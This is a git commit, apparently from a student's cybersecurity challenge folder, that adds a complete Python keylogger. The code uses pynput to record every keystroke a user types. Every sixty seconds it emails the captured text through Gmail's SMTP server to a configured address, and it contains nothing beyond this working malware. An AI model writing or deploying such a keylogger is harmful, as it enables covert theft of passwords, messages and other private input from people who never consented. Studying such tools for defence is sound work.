c8558259d550e748917d5ac9fb9b5abeb97fcb06
Fatima Teixeira <fatima.fpat@gmail.com>
2025-11-30 14:15:55 -0300

    Add files

---
+++ Desafio_Ciberseguranca/Keylogger/keylogger_email.py
@@ -0,0 +1,50 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMEText
+from threading import Timer
+
+log =""
+#Configurações de email
+EMAIL_ORIGEM = " " # colocar email do google
+EMAIL_DESTINO = " " # colocar email do google
+SENHA_EMAIL= " " #Senha gerada em https://myaccount.google.com/apppasswords
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMEText(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+        try: 
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            print("Erro ao enviar", e)
+    
+        log = ""
+
+    Timer(60, enviar_email).start()
+
+def on_press(key):
+    global log
+    try:
+        log+= key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif key == keyboard.Key.backspace:
+            log += "[<]"
+        else:
+            pass #ignorar ctrl, shift, etc...
+
+#Inicia o keylogger e envio automatico
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join() 
